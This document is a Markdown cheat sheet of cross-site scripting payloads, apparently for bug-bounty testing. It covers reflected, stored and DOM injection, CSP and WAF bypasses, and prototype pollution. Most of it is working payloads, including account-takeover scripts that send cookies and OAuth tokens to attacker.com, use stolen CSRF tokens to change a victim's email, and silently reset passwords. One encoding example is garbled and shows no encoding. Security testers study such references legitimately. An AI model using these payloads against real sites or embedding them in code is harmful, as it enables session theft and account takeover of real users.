# XSS — Cross-Site Scripting

## Overview

Cross-Site Scripting (XSS) injects malicious scripts into web pages viewed by other
users. XSS falls under OWASP A03:2021 (Injection) and consistently appears in the top
HackerOne vulnerability categories by bounty volume.

**Types:**
- **Reflected** — payload in request, reflected in response, requires victim to click link
- **Stored** — payload persisted server-side, executes for all viewers of that content
- **DOM-based** — payload processed entirely client-side via unsafe JavaScript

**Impact:** Session hijacking, account takeover, credential phishing, keylogging,
CSRF token theft, malware distribution, defacement.

**Sources:**
- PortSwigger Web Security Academy — Cross-site scripting
- OWASP Testing Guide — OTG-INPVAL-001
- HackerOne Hacktivity — Twitter XSS ($5,040), Shopify stored XSS ($3,000+)

---

## Reflected XSS

Payload echoed from request directly into response. Requires victim to click a crafted URL.

### HTML Context

```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Tag injection when < > not filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### Attribute Context

```html
<!-- Breaking out of attribute value -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
'><script>alert(1)</script>

<!-- When inside href attribute -->
javascript:alert(1)
javascript:alert(document.cookie)

<!-- data: URI for src attributes -->
data:text/html,<script>alert(1)</script>
```

### JavaScript Context

```javascript
// Breaking out of JS string
'-alert(1)-'
';alert(1)//
\';alert(1)//

// Template literal injection
`${alert(1)}`

// Regex context
/'-alert(1)-'/

// When inside a JS comment
*/alert(1)/*
```

### URL Parameter Injection

```
https://target.com/search?q=<script>alert(1)</script>
https://target.com/search?q="><img src=x onerror=alert(1)>
https://target.com/error?msg=<svg/onload=alert(1)>
```

---

## Stored XSS

Payload is saved server-side and executes whenever the stored content is rendered.

### High-Value Storage Targets

```
- Profile fields: username, bio, display name, company, location
- Comments and reviews
- Chat messages (especially admin-facing support chats)
- Ticket/issue descriptions and comments
- File upload filename (displayed in UI)
- Address / shipping fields
- Custom dashboard widget names or labels
- API key descriptions or app names (OAuth apps)
- Notification messages or custom alert text
- Error messages that echo user input
```

### SVG Upload XSS

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">alert(document.cookie);</script>
</svg>
```

### HTML File Upload XSS

```html
<!-- Upload as .html or .htm if allowed -->
<!DOCTYPE html>
<html><body>
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
</body></html>
```

---

## DOM-Based XSS

Vulnerability exists entirely in client-side JavaScript — no server involvement in
the injection path.

### Sources (attacker-controlled input)

```javascript
location.href
location.search       // ?param=value
location.hash         // #value
location.pathname
document.URL
document.referrer
document.cookie       // when attacker can set cookies (e.g., CRLF injection)
window.name
postMessage (event.data)
localStorage / sessionStorage  // if attacker can write via other means
```

### Dangerous Sinks

```javascript
// Direct HTML injection
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);

// URL-based sinks
location.href = userInput;
location.replace(userInput);
location.assign(userInput);
element.src = userInput;
element.href = userInput;
element.action = userInput;

// JS execution sinks
eval(userInput);
setTimeout(userInput, 0);
setInterval(userInput, 0);
new Function(userInput)();
element.setAttribute('onload', userInput);

// jQuery-specific
$(userInput)            // Selector treated as HTML
$.html(userInput)
$.append(userInput)
```

### DOM XSS via Hash / Search

```javascript
// Vulnerable pattern: writes hash directly to innerHTML
document.getElementById('output').innerHTML = location.hash.slice(1);

// Exploit URL:
https://target.com/page#<img src=x onerror=alert(1)>

// Vulnerable search param write
var search = new URLSearchParams(location.search);
document.querySelector('.result').innerHTML = search.get('q');
// Exploit: https://target.com/?q=<svg onload=alert(1)>
```

### postMessage DOM XSS

```javascript
// Vulnerable listener with no origin check
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});

// Exploit from attacker.com:
var target = window.open('https://victim.com');
target.postMessage('<img src=x onerror=alert(1)>', '*');
```

### AngularJS Template Injection

```javascript
// In AngularJS 1.x (pre-sandbox escape era or broken sandbox)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

// Sandbox escapes (Angular 1.0-1.5):
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

---

## CSP Bypass Techniques

### JSONP Endpoint Abuse

```html
<!-- If CSP whitelists googleapis.com, find a JSONP endpoint there -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- Common JSONP bypass targets when domain is whitelisted -->
<script src="https://WHITELISTED-CDN.com/jsonp?callback=alert(1)"></script>
```

### Unsafe-Inline via Nonce Leak

```html
<!-- If nonce leaks in a reflected context (e.g., meta tag, inline data) -->
<!-- Read the nonce value and include it in your payload -->
<script nonce="LEAKED-NONCE">alert(1)</script>
```

### base-uri Injection

```html
<!-- CSP without base-uri restriction allows base tag injection -->
<!-- Relative script src then loads from attacker's domain -->
<base href="https://attacker.com/">
<!-- Existing relative <script src="/js/app.js"> now loads from attacker.com -->
```

### Script Gadgets (bypass strict-dynamic / trusted types)

```html
<!-- Angular gadget: if angular.js loaded from whitelisted domain -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

<!-- jQuery gadget: if jQuery loaded -->
<script>$.globalEval('alert(1)')</script>

<!-- Script gadget tools: https://github.com/nicerstomsorg/csp-bypass -->
```

### CDN-Hosted Library Abuse

```html
<!-- If CDN like cdnjs.cloudflare.com is whitelisted, find a gadget in any hosted lib -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

---

## Prototype Pollution → XSS

### Client-Side Prototype Pollution

```javascript
// Injecting into Object.prototype via query params
?__proto__[x]=alert(1)
?constructor[prototype][x]=alert(1)

// JSON-based (if app uses JSON.parse with merge)
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```

### Gadget Chains

```javascript
// jQuery < 3.4 — $.extend deep merge pollutes prototype
$.extend(true, {}, JSON.parse(userInput));

// Lodash _.merge (pre-4.17.5) — merge pollutes prototype
_.merge({}, userInput);

// Once Object.prototype is polluted, find a gadget that uses it:
// e.g., if code does: var opts = {}; document.write(opts.template)
// and template key is undefined — prototype pollution sets it to payload
```

### Common Gadgets to Test After Pollution

```javascript
// After polluting __proto__.innerHTML or __proto__.srcdoc:
document.getElementById('x').innerHTML = obj.innerHTML || '';
// → If obj.innerHTML is undefined, falls back to prototype → XSS

// Check for gadgets in DOMPurify, sanitize-html, angular, etc.
```

---

## WAF / Filter Bypass Payloads

### Case and Tag Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT/src="data:,alert(1)">
```

### Alternative Event Handlers

```html
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<object data="javascript:alert(1)">
<body onresize=alert(1) style="height:1px">
<body onscroll=alert(1)><br><br><br>...<br>
<input type=image src=x onerror=alert(1)>
<isindex action="javascript:alert(1)" type=image>
```

### HTML5 Vectors

```html
<details open ontoggle=alert(1)>
<dialog open onclose=alert(1)>
<math href="javascript:alert(1)">click</math>
<keygen autofocus onfocus=alert(1)>
```

### SVG and MathML

```html
<svg><script>alert&#40;1&#41;</script></svg>
<svg><script>alert(1)</script></svg>
<math><mtext></p><script>alert(1)</script></mtext></math>
```

### Encoding Bypass

```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- Unicode -->
<script>alert(1)</script>
<!-- Hex encoding in JS string -->
<script>eval('\x61\x6c\x65\x72\x74\x281\x29')</script>
```

### Polyglots

```
javascript:"/*\"/*`/*' /*</template>
</textarea></xmp></style></noscript></noembed></select></script>
<-- <img src=x:confirm`` onerror=eval(src) ''> -->
```

### Comment Injection to Break Filters

```html
<!-- Break keyword matching -->
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
<img src=x onerror="alert(1)">
```

---

## XSS → Account Takeover Chains

### Cookie Theft

```javascript
// Exfiltrate cookies to attacker server
<script>
new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>

// Via fetch
<script>
fetch('https://attacker.com/steal?c=' + btoa(document.cookie));
</script>
```

### CSRF Token Theft + Action

```javascript
// 1. Fetch the page with CSRF token
// 2. Extract token
// 3. Submit form with stolen token
<script>
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/csrf[_-]token['"]\s+value=['"]([^'"]+)/i)[1];
    return fetch('/account/email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=attacker@evil.com&csrf_token=' + token
    });
  });
</script>
```

### OAuth Token Theft via postMessage

```javascript
// If app uses postMessage to return OAuth tokens from popup:
<script>
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/steal?token=' + JSON.stringify(e.data));
});
// Then trigger the OAuth popup from within XSS context
window.open('/oauth/authorize?...');
</script>
```

### Password Change via XSS (No Old Password Required)

```javascript
<script>
fetch('/account/change_password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({new_password: 'Hacked123!', confirm_password: 'Hacked123!'})
});
</script>
```

### Add Attacker-Controlled Email / 2FA Bypass

```javascript
// Add attacker email as secondary → trigger verify → take over
<script>
fetch('/api/account/emails', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

---

## Common DOM XSS Source → Sink Pairs

| Source | Sink | Example |
|--------|------|---------|
| `location.hash` | `innerHTML` | `el.innerHTML = location.hash.slice(1)` |
| `location.search` | `document.write` | `document.write(new URLSearchParams(location.search).get('q'))` |
| `document.referrer` | `innerHTML` | Display "back to" link using referrer |
| `postMessage event.data` | `innerHTML` | Trusted-origin-less message listener |
| `localStorage` value | `eval` | Deserializing stored user preferences |
| `window.name` | `innerHTML` | Cross-page data passing via window.name |
| `location.href` | `location.href` (open redirect) | `location = location.search.slice(5)` |

### Framework-Specific Dangerous APIs

```javascript
// React — bypasses virtual DOM sanitization
dangerouslySetInnerHTML={{ __html: userInput }}

// Vue — renders raw HTML
<div v-html="userInput"></div>

// Angular — bypass DomSanitizer
this.sanitizer.bypassSecurityTrustHtml(userInput)

// jQuery — treats string as HTML if it starts with <
$(userInput)  // jQuery selector / HTML insertion
$('div').html(userInput)
$('div').append(userInput)
```

---

## Detection Notes

- Test every input field — not just search bars; focus on lesser-tested areas (filenames, headers, API responses rendered in UI)
- Use unique strings (e.g., `xsstest1234`) first to find where input is reflected before adding event handlers
- Check both HTML source and DOM (rendered) — some XSS only appears after JS renders the page
- For stored XSS, check if the payload executes in admin panels viewing user-submitted content
- Use browser DevTools console errors to identify blocked payloads and tune bypasses
- Test CSP header with `https://csp-evaluator.withgoogle.com/` to identify bypasses before crafting payloads
